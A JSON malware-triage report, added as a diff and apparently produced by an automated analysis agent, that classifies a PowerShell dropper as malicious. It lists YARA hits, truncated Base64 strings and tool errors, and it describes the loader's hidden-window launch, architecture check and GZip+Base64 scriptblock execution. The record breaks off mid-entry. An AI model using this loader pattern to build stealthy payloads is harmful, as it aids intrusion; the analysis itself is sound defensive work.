@@ -1,0 +1,2934 @@
+{
+  "verdict": "malicious",
+  "confidence": 90,
+  "summary": "PowerShell dropper/loader script that uses architecture-aware execution, hidden window launch (-nop -w hidden), and a double-encoded (Base64 + GZip) payload delivered via [scriptblock]::create(). The encoded payload (2800 bytes of dense Base64) is a classic technique used by PowerShell Empire, Cobalt Strike stagers, and document-embedded macro payloads. YARA rules matched for RunShell (lateral movement), Powershell execution, Base64 encoding, domain regex, and IPv6 patterns.",
+  "key_evidence": [
+    "Malcat YARA hit: 'RunShell' rule (category: lateral movement, reliability 70) \u2014 starts a shell",
+    "Malcat YARA hit: 'Powershell' rule (category: lateral movement, reliability 30) \u2014 runs a powershell script",
+    "YARA checklist: contains_base64 rule matched (16 pattern hits at offset 52)",
+    "YARA checklist: domain_regex matched, powershell matched at offset 59, ipv6 matched at offset 11",
+    "IDA strings: full script reveals '-nop -w hidden -c' flags for hidden execution with no PowerShell profile",
+    "IDA strings: architecture check '[IntPtr]::Size -eq 4' with sysnative path workaround for 32/64-bit compatibility",
+    "IDA strings: dynamic code execution via [scriptblock]::create() with GZip+Base64 decoded payload (H4sI GZip magic header)",
+    "Malcat strings: 12+ long Base64-encoded strings identified, indicating heavily obfuscated payload",
+    "Malcat: file type text/utf8, 2800 bytes, entropy 148 \u2014 consistent with encoded PowerShell payload"
+  ],
+  "reasoning": "",
+  "incomplete_tooling": false,
+  "successful_tool_calls": 8,
+  "successful_non_bootstrap_tools": 4,
+  "tool_gate": {
+    "ok": true,
+    "format": "text",
+    "required": [
+      "yara",
+      "r2_decomp",
+      "xor"
+    ],
+    "tools": {
+      "yara": {
+        "ok": true,
+        "why": "ok"
+      },
+      "r2_decomp": {
+        "ok": true,
+        "why": "ok"
+      },
+      "xor": {
+        "ok": true,
+        "why": "ok"
+      },
+      "capa": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "pe_imports": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "floss": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "dotnet": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "upx": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "speakeasy": {
+        "ok": true,
+        "why": "not_applicable:text"
+      },
+      "frida_probe": {
+        "ok": true,
+        "why": "not_applicable:text"
+      }
+    },
+    "hard_failures": [],
+    "soft_failures": [],
+    "missing": [],
+    "not_applicable": [
+      "capa",
+      "pe_imports",
+      "floss",
+      "dotnet",
+      "upx",
+      "speakeasy",
+      "frida_probe"
+    ],
+    "large_sample": false
+  },
+  "checklist_ok": true,
+  "sql_deep_ok": true,
+  "sql_deep_attempted": true,
+  "sql_deep_succeeded_calls": 2,
+  "tools_raw_keys": [
+    "yara",
+    "malcat",
+    "r2_decomp",
+    "xor"
+  ],
+  "source": "deep_dive_agentic",
+  "engine": "langgraph",
+  "planner_model": "mimo-v2.5-pro",
+  "verdict_model": "mimo-v2.5-pro",
+  "steps_used": 14,
+  "history": [
+    {
+      "step": 0,
+      "tool": "yara_scan",
+      "args": {},
+      "reason": "Required checklist tool (yara)",
+      "result": {
+        "rule_count": 5,
+        "matches": [
+          {
+            "rule": "domain",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$domain_regex",
+                "offset": 0,
+                "length": 2,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "powershell",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$a",
+                "offset": 59,
+                "length": 10,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "IP",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$ipv6",
+                "offset": 11,
+                "length": 2,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "contains_base64",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": [
+              {
+                "id": "$a",
+                "offset": 52,
+                "length": 16,
+                "xor_key": null
+              }
+            ]
+          },
+          {
+            "rule": "Antivirus",
+            "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+            "strings": []
+          }
+        ],
+        "engine": "yara-x",
+        "rules_compiled": 454,
+        "compile_errors": [
+          "/opt/samples/rules/flat/Android_Amtrckr_20160519.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_Amtrckr_20160519.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_Backdoor.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Backdoor.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/MALW_Httpsd_ELF.yar: error[E009]: unknown identifier `is__elf`\n  --> /opt/samples/rules/flat/MALW_Httpsd_ELF.yar:54:14\n   |\n54 |          and is__elf\n   |              ^^^^^^^ this identifier has not been declared",
+          "/opt/samples/rules/flat/Android_Pink_Locker.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Pink_Locker.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_pornClicker.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_pornClicker.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_Spywaller.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_Spywaller.yar:10:1\n   |\n10 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_OmniRat.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_OmniRat.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Wshell_ChineseSpam.yar: error[E014]: invalid regular expression\n  --> /opt/samples/rules/flat/Wshell_ChineseSpam.yar:17:42\n   |\n17 |         $c = /if ?\\(\\$_POST\\[Submit\\]\\) ?{/\n   |                                          ^ unclosed counted repetition\n   |\n   = note: did you mean `\\{` instead of `{`?",
+          "/opt/samples/rules/flat/Android_FakeBank_Fanta.yar: error[E010]: unknown module `androguard`\n --> /opt/samples/rules/flat/Android_FakeBank_Fanta.yar:6:1\n  |\n6 | import \"androguard\"\n  | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found",
+          "/opt/samples/rules/flat/Android_AliPay_smsStealer.yar: error[E010]: unknown module `androguard`\n  --> /opt/samples/rules/flat/Android_AliPay_smsStealer.yar:11:1\n   |\n11 | import \"androguard\"\n   | ^^^^^^^^^^^^^^^^^^^ module `androguard` not found"
+        ],
+        "incomplete": true
+      },
+      "error": null,
+      "checklist": true,
+      "bootstrap": true
+    },
+    {
+      "step": 0,
+      "tool": "malcat_analyze",
+      "args": {
+        "profile": "deep"
+      },
+      "reason": "Required checklist tool (malcat)",
+      "result": {
+        "analysis_id": 1,
+        "path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "profile": "deep",
+        "limits": {
+          "strings_max": 300,
+          "imports_max": 300,
+          "functions_max": 30,
+          "anomaly_locations_max": 50,
+          "decompile_top_n": 3
+        },
+        "file_summary": {
+          "analysis_id": 1,
+          "file_name": "3048.ps1",
+          "file_path": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+          "file_size": 2800,
+          "type": "text/utf8",
+          "architecture": "NONE",
+          "entropy": 148,
+          "sha256": "14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2",
+          "metadata": {},
+          "entrypoint_ea": null,
+          "layout": [
+            {
+              "name": "",
+              "effective_address": 0,
+              "physical_size": 2800,
+              "virtual_size": 2800,
+              "rights": "",
+              "entropy": 148
+            }
+          ],
+          "kesakode_verdict": []
+        },
+        "views": {
+          "anomalies": [],
+          "anomaly_locations": {},
+          "yara_hits": [
+            {
+              "id": "RunShell",
+              "category": "lateral movement",
+              "reliability": 70,
+              "type": "UNCOMMON",
+              "description": "starts a shell",
+              "num_patterns": 1
+            },
+            {
+              "id": "Powershell",
+              "category": "lateral movement",
+              "reliability": 30,
+              "type": "SUSPICIOUS",
+              "description": "runs a powershell script",
+              "num_patterns": 1
+            }
+          ],
+          "strings": [
+            {
+              "ea": 75,
+              "summary": "powershell"
+            },
+            {
+              "ea": 100,
+              "summary": "powershell"
+            },
+            {
+              "ea": 1575,
+              "summary": "o7pr3d3E1k5jz02X..GAV521nIJ17x5ls7"
+            },
+            {
+              "ea": 1846,
+              "summary": "Gpbr0XQ3VYSTpa6N..K7RjgOTuuIzjddpQ"
+            },
+            {
+              "ea": 922,
+              "summary": "T3JylvqFE5qcDlZQ..8BxX0ldul5V1Ngah"
+            },
+            {
+              "ea": 1173,
+              "summary": "2hkmcF9neg5RB7Ja..gNN9JfmZNyjAfv3v"
+            },
+            {
+              "ea": 775,
+              "summary": "P3VqrGPCxLhlhYXO..vUr8SyWQmhdZowlJ"
+            },
+            {
+              "ea": 2159,
+              "summary": "7F96i2Gg0GWOMwld..QKGJS8cXU5oqmLUV"
+            },
+            {
+              "ea": 2364,
+              "summary": "sX3hKXG549OGzo9r..I49gUI8fvDGiZpyZ"
+            },
+            {
+              "ea": 1436,
+              "summary": "JIzORjuBW1XFNGUr..9XwoM3DpQaGhpNAC"
+            },
+            {
+              "ea": 1379,
+              "summary": "WYuJycRmqIaC0cyb..HFpK8G8ENJPljUam"
+            },
+            {
+              "ea": 1500,
+              "summary": "AraaEnCWshkAR1OD..yqRk6mZ4sh9tvdsR"
+            },
+            {
+              "ea": 1973,
+              "summary": "WZ4ZLhY3guI7s7G0..k2HoVJV9N3SWvZUI"
+            },
+            {
+              "ea": 1777,
+              "summary": "2RwaVKLc7mCSsNxE..HH6NuKI6Oev8Z3at"
+            },
+            {
+              "ea": 2027,
+              "summary": "Eo2s3vBUtuLYploi..fAfYge4eCdAvfIwo"
+            },
+            {
+              "ea": 1327,
+              "summary": "JoEvjoV91JZMDbXv..IXc2SSEI5HvQvpYH"
+            },
+            {
+              "ea": 607,
+              "summary": "611R5MNolexcoi8E..PEQ8yVlplSUvD1X3"
+            },
+            {
+              "ea": 2679,
+              "summary": "RedirectStandardOutput"
+            },
+            {
+              "ea": 409,
+              "summary": "ayBL9nEj5D9YKCaN..yGnURa6drYHkwwDz"
+            },
+            {
+              "ea": 2320,
+              "summary": "VXTTL1eqvOE8I0eJ..wy8c6oqJlKaeOxGh"
+            },
+            {
+              "ea": 1279,
+              "summary": "lU0vnCWIVFB8MI7S..VDfCvzH9olicnRhm"
+            },
+            {
+              "ea": 696,
+              "summary": "JkW7RcEve6LTvO0R..MiTPy83oAY4JfhYp"
+            },
+            {
+              "ea": 511,
+              "summary": "2aOMhRxfK28a3K18..rjhpv3sB8jQ64Xzj"
+            },
+            {
+              "ea": 483,
+              "summary": "1HVVXXqdHVv97FXkCTmQoNyv797"
+            },
+            {
+              "ea": 1741,
+              "summary": "UHz3R3ZHxwY5Hh0k..JU96hldxPZFqKB04"
+            },
+            {
+              "ea": 881,
+              "summary": "4CWlvQHtOPaD257u..795uK5oQ7SVLoPfm"
+            },
+            {
+              "ea": 1129,
+              "summary": "JmRhR7Dc5Mc7JdUncF8m5W"
+            },
+            {
+              "ea": 652,
+              "summary": "7fdx5ayuc9ojlfN8..Lp7Te4P5sMINWmWK"
+            },
+            {
+              "ea": 2074,
+              "summary": "IDsion4QRXMVBygw..hhaEOO1Cli8oxT7A"
+            },
+            {
+              "ea": 260,
+              "summary": "StreamReader"
+            },
+            {
+              "ea": 558,
+              "summary": "fhzuswzHxWXcusOFmOc42lCCc77B"
+            },
+            {
+              "ea": 2553,
+              "summary": "hPfju7f8AKrkmBB0MAAA"
+            },
+            {
+              "ea": 2529,
+              "summary": "KjBcPP5YRyPv22tirfbYv3k"
+            },
+            {
+              "ea": 150,
+              "summary": "ProcessStartInfo"
+            },
+            {
+              "ea": 2603,
+              "summary": "CompressionMode"
+            },
+            {
+              "ea": 2653,
+              "summary": "UseShellExecute"
+            },
+            {
+              "ea": 52,
+              "summary": "WindowsPowerShell"
+            },
+            {
+              "ea": 2129,
+              "summary": "bH1z1MLK3pr6ViKTDmYgGxlzs9MVK"
+            },
+            {
+              "ea": 339,
+              "summary": "MemoryStream"
+            },
+            {
+              "ea": 1153,
+              "summary": "irr6nBfFQXlTbPTQqHK"
+            },
+            {
+              "ea": 390,
+              "summary": "H4sIAAKbYF0CA7VWa4"
+            },
+            {
+              "ea": 2262,
+              "summary": "LU1Xn65QIK0ZBrcTlzhPbecnVh"
+            },
+            {
+              "ea": 2289,
+              "summary": "gQNQ"
+            },
+            {
+              "ea": 2503,
+              "summary": "CFAfzRuF5ECBE24Yii"
+            },
+            {
+              "ea": 91,
+              "summary": "else"
+            },
+            {
+              "ea": 1728,
+              "summary": "XHxWnyqBynZr"
+            },
+            {
+              "ea": 2250,
+              "summary": "Mo7IwddEbwZ"
+            },
+            {
+              "ea": 294,
+              "summary": "Compression"
+            },
+            {
+              "ea": 2447,
+              "summary": "4xLtTc9791g9bIWfph"
+            },
+            {
+              "ea": 2591,
+              "summary": "Compression"
+            },
+            {
+              "ea": 138,
+              "summary": "Diagnostics"
+            },
+            {
+              "ea": 2621,
+              "summary": "Decompress"
+            },
+            {
+              "ea": 2735,
+              "summary": "CreateNoWindow"
+            },
+            {
+              "ea": 2767,
+              "summary": "Diagnostics"
+            },
+            {
+              "ea": 1552,
+              "summary": "n3R8ujJU71sRiqM1"
+            },
+            {
+              "ea": 2789,
+              "summary": "Start"
+            },
+            {
+              "ea": 4,
+              "summary": "IntPtr"
+            },
+            {
+              "ea": 231,
+              "summary": "create"
+            },
+            {
+              "ea": 2779,
+              "summary": "Process"
+            },
+            {
+              "ea": 2296,
+              "summary": "YMX5z7b93TOsryEFGoB3AFV"
+            },
+            {
+              "ea": 33,
+              "summary": "windir"
+            },
+            {
+              "ea": 2724,
+              "summary": "Hidden"
+            },
+            {
+              "ea": 204,
+              "summary": "hidden"
+            },
+            {
+              "ea": 587,
+              "summary": "cG5Ic7w"
+            },
+            {
+              "ea": 2469,
+              "summary": "idS3SIXz8f8bry9w"
+            },
+            {
+              "ea": 217,
+              "summary": "scriptblock"
+            },
+            {
+              "ea": 170,
+              "summary": "FileName"
+            },
+            {
+              "ea": 2117,
+              "summary": "5Gx9vtUIKw5"
+            },
+            {
+              "ea": 2635,
+              "summary": "ReadToEnd"
+            },
+            {
+              "ea": 371,
+              "summary": "FromBase64String"
+            },
+            {
+              "ea": 42,
+              "summary": "sysnative"
+            },
+            {
+              "ea": 546,
+              "summary": "XkxTOYkQiR8"
+            },
+            {
+              "ea": 595,
+              "summary": "9nmEXsF9ztX"
+            },
+            {
+              "ea": 867,
+              "summary": "CpKPfH3FF"
+            },
+            {
+              "ea": 757,
+              "summary": "PcJ7Xm9w92"
+            },
+            {
+              "ea": 2486,
+              "summary": "rH4XhkLzEu9X03"
+            },
+            {
+              "ea": 445,
+              "summary": "B2dGqsRu7h"
+            },
+            {
+              "ea": 464,
+              "summary": "vfbzXgyexmskpWui2Q"
+            },
+            {
+              "ea": 185,
+              "summary": "Arguments"
+            },
+            {
+              "ea": 2711,
+              "summary": "WindowStyle"
+            },
+            {
+              "ea": 277,
+              "summary": "Object"
+            },
+            {
+              "ea": 2670,
+              "summary": "false"
+            },
+            {
+              "ea": 2522,
+              "summary": "PG9eC"
+            },
+            {
+              "ea": 2760,
+              "summary": "System"
+            },
+            {
+              "ea": 2581,
+              "summary": "System"
+            },
+            {
+              "ea": 131,
+              "summary": "System"
+            },
+            {
+              "ea": 124,
+              "summary": "Object"
+            },
+            {
+              "ea": 2441,
+              "summary": "3arKb"
+            },
+            {
+              "ea": 737,
+              "summary": "FHETD1C"
+            },
+            {
+              "ea": 690,
+              "summary": "rhMvS"
+            },
+            {
+              "ea": 1829,
+              "summary": "yJDIb"
+            },
+            {
+              "ea": 1839,
+              "summary": "T1np5e"
+            },
+            {
+              "ea": 456,
+              "summary": "Yjthkwu"
+            },
+            {
+              "ea": 361,
+              "summary": "Convert"
+            },
+            {
+              "ea": 354,
+              "summary": "System"
+            },
+            {
+              "ea": 329,
+              "summary": "System"
+            },
+            {
+              "ea": 322,
+              "summary": "Object"
+            },
+            {
+              "ea": 284,
+              "summary": "System"
+            },
+            {
+              "ea": 250,
+              "summary": "System"
+            },
+            {
+              "ea": 243,
+              "summary": "Object"
+            },
+            {
+              "ea": 1115,
+              "summary": "pCiPG9y8z0cNK"
+            },
+            {
+              "ea": 2703,
+              "summary": "true"
+            },
+            {
+              "ea": 2751,
+              "summary": "true"
+            },
+            {
+              "ea": 1374,
+              "summary": "qa0Q"
+            },
+            {
+              "ea": 745,
+              "summary": "LfB268yzxRN"
+            },
+            {
+              "ea": 306,
+              "summary": "GzipStream"
+            },
+            {
+              "ea": 915,
+              "summary": "tzH4Bk"
+            },
+            {
+              "ea": 1569,
+              "summary": "tdNWz"
+            },
+            {
+              "ea": 13,
+              "summary": "Size"
+            }
+          ],
+          "imports": [],
+          "sections": [
+            {
+              "name": "",
+              "effective_address": 0,
+              "physical_size": 2800,
+              "virtual_size": 2800,
+              "rights": "",
+              "entropy": 148
+            }
+          ],
+          "entropy": {
+            "file_entropy": 148,
+            "regions": [
+              {
+                "name": "",
+                "entropy": 148,
+                "size": null
+              }
+            ]
+          },
+          "functions": [],
+          "constants": [],
+          "carved": [],
+          "virtual_files": [],
+          "structures": []
+        },
+        "functions": [],
+        "constants": [],
+        "anomalies": [],
+        "carved_files": [],
+        "virtual_files": [],
+        "structures": [],
+        "decompilations": {},
+        "script_decompile": null,
+        "unpack_result": null,
+        "errors": []
+      },
+      "error": null,
+      "checklist": true,
+      "bootstrap": true
+    },
+    {
+      "step": 0,
+      "tool": "r2_decompile",
+      "args": {},
+      "reason": "Required checklist tool (r2_decomp)",
+      "result": {
+        "r2_ok": true,
+        "sample": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "disassembly": {
+          "0x00000000": "\u250c 1906: fcn.00000000 (int64_t arg1, int64_t arg2, int64_t arg3, int64_t arg4, int64_t arg5, int64_t arg6, int64_t arg_31h, int64_t arg_32h, int64_t arg_36h, int64_t arg_41h, int64_t arg_49h, int64_t arg_4ah, int64_t arg_56h, int64_t arg_63h, int64_t arg_6ah, int64_t arg_79h);\n\u2502           ; arg int64_t arg1 @ rdi\n\u2502           ; arg int64_t arg2 @ rsi\n\u2502           ; arg int64_t arg3 @ rdx\n\u2502           ; arg int64_t arg4 @ rcx\n\u2502           ; arg int64_t arg5 @ r8\n\u2502           ; arg int64_t arg6 @ r9\n\u2502           ; arg int64_t arg_31h @ rbp+0x31\n\u2502           ; arg int64_t arg_32h @ rbp+0x32\n\u2502           ; arg int64_t arg_36h @ rbp+0x36\n\u2502           ; arg int64_t arg_41h @ rbp+0x41\n\u2502           ; arg int64_t arg_49h @ rbp+0x49\n\u2502           ; arg int64_t arg_4ah @ rbp+0x4a\n\u2502           ; arg int64_t arg_56h @ rbp+0x56\n\u2502           ; arg int64_t arg_63h @ rbp+0x63\n\u2502           ; arg int64_t arg_6ah @ rbp+0x6a\n\u2502           ; arg int64_t arg_79h @ rbp+0x79\n\u2502           0x00000000      6966285b49..   imul esp, dword [rsi + 0x28], 0x746e495b\n\u2502           0x00000007      50             push rax\n\u2502       \u250c\u2500< 0x00000008      7472           je 0x7c\n\u2502       \u2502   0x0000000a      5d             pop rbp\n\u2502       \u2502   0x0000000b      3a3a           cmp bh, byte [arg_49h]      ; arg3\n\u2502       \u2502   0x0000000d      53             push rbx\n\u2502       \u2502   0x0000000e      697a65202d..   imul edi, dword [rdx + 0x65], 0x71652d20\n\u2502       \u2502   0x00000015      203429         and byte [rcx + rbp], dh    ; arg4\n\u2502      \u250c\u2500\u2500< 0x00000018      7b24           jnp 0x3e\n\u2502      \u2502\u2502   0x0000001a      62             invalid\n..\n    \u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x1a0(w)\n\u2502  \u2502\u2502\u2502\u2502\u2514\u2500\u2500> 0x0000003e      657253         jb 0x94\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x70e(w)\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2502   0x00000041      68656c6c5c     push 0x5c6c6c65             ; 'ell\\\\'\n\u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x00000046      7631           jbe 0x79\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000048      2e305c706f     xor byte cs:[rax + rsi*2 + 0x6f], bl\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x6aa(r)\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x0000004d      7765           ja 0xb4\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x0000004f      7273           jb 0xc4\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000051      68656c6c2e     push 0x2e6c6c65             ; 'ell.'\n\u2502 \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500< 0x00000056      657865         js 0xbe\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   0x00000059      27             invalid\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x72c(r), 0x7b7(r)\n..\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0xb3(r)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x3e4(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x805(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x606(r), 0xa5a(r)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x5a1(w), 0x9fb(w)\n  \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREFS from fcn.00000000 @ 0x43e(r), 0x440(w)\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2502\u2502   ; DATA XREF from fcn.00000000 @ 0x954(w)\n\u2502 \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500> 0x00000079      65772d         ja 0xa9\n\u2502  \u2502\u2502\u2502\u2502\u2502\u2514\u2500> 0x0000007c      4f             invalid\n..\n\u2502 \u2502\u2502\u2502\u2502\u2502\u2514\u2500\u2500> 0x00000094      732e           jae 0xc4\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x00000096      50             push rax\n\u2502 \u2502\u2502\u2502\u2502\u2502 \u2502   0x00000097      726"
+        },
+        "engine": "pdf (disasm)",
+        "fallback": true,
+        "functions_attempted": [
+          "0x00000000"
+        ]
+      },
+      "error": null,
+      "checklist": true,
+      "bootstrap": true
+    },
+    {
+      "step": 0,
+      "tool": "xor_string_search",
+      "args": {},
+      "reason": "Required checklist tool (xor)",
+      "result": {
+        "xorsearch_ok": false,
+        "sample": "/opt/samples/corpus/day6/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/3048.ps1",
+        "candidates": [],
+        "xorsearch_stdout": "",
+        "xorsearch_stderr": "",
+        "xorsearch_returncode": 1
+      },
+      "error": null,
+      "checklist": true,
+      "bootstrap": true
+    },
+    {
+      "step": 0,
+      "tool": "signal_extractors",
+      "args": {},
+      "reason": "Deterministic anti-analysis + dynamic-import-resolve signals + emulation oracle",
+      "result": {
+        "anti_analysis_summary": {},
+        "dynamic_resolve_summary": {},
+        "emulation_oracle_ok": false,
+        "emulation_oracle_error": "SpeakeasyError: Emulator not initialized",
+        "executed_functions": 0,
+        "dyn_import_count": null
+      },
+      "error": "RuntimeError: ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n",
+      "checklist": true
+    },
+    {
+      "step": 0,
+      "tool": "ghidra_query",
+      "args": {
+        "sql": "SELECT name, address, size FROM funcs ORDER BY size DESC LIMIT 25",
+        "max_rows": 25
+      },
+      "reason": "Auto SQL seed for large-mode deep RE gate",
+      "result": {
+        "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n"
+      },
+      "error": "ghidrasql server died during startup for ghidra-pe-14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (rc=1); tail of log:\nening existing project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessAnalyzer)  \nINFO  Opening project: /home/remnux/ghidra-projects/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2/14a42d6418b38103a7fdccc5b1d37e4fb0efcad2f847c9996465c5fdc78632c2 (HeadlessProject)  \nERROR Abort due to Headless analyzer error: Requested project program file(s) not found: 3048.ps1 (HeadlessAnalyzer) java.io.IOException: Requested project program file(s) not found: 3048.ps1\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processNoImport(HeadlessAnalyzer.java:1404)\n\tat ghidra.app.util.headless.HeadlessAnalyzer.processLocal(HeadlessAnalyzer.java:461)\n\tat ghidra.app.util.headless.AnalyzeHeadless.launch(AnalyzeHeadless.java:199)\n\tat ghidra.GhidraLauncher.launch(GhidraLauncher.java:81)\n\tat ghidra.Ghidra.main(Ghidra.java:54)\n \nGhidra exited before becoming ready (exit code 1)\n",
+      "auto_sql": true
+    },
+    {
+      "step": 7,
+      "tool": "floss_extract",
+      "args": {},
+      "reason": "langgraph tool call",
+      "result": {
+        "skipped": true,
+        "fail_open": true,
+        "reason": "not_applicable:text",
+        "error": "FLOSS supports PE only (got text)",
+        "string_count": 0,
+        "strings": [],
+        "floss_profile": "skipped",
+        "duration_s": 0.0
+      },
+      "error": "FLOSS supports PE only (got text)",
+      "engine": "langgraph"
+    },
+    {
+      "step": 8,
+      "tool": "malcat_analyze",
+      "args": {
+        "profile": "deep"
+      },
+      "reason": "langgraph tool call",
+      "result": {
+        "analysis_id": 1,
